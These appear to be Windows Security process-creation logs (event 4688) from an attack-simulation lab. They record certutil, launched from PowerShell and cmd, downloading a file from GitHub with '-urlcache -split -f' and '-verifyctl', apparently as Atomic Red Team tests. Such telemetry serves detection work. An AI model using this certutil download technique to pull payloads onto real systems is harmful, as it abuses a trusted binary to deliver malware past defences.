Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:45 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52741440
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a30
	New Process Name:	C:\Windows\System32\certutil.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1104
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\certutil.exe" -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:44 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52741040
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1104
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$datePath = \""certutil-$(Get-Date -format yyyy_MM_dd)\""
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike \""*.txt\""} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52740894
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xba4
	New Process Name:	C:\Windows\System32\certutil.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x13a0
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	certutil  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"  

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52740893
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x13a0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xc2c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	"cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"  

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52740878
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xc2c
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1138
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
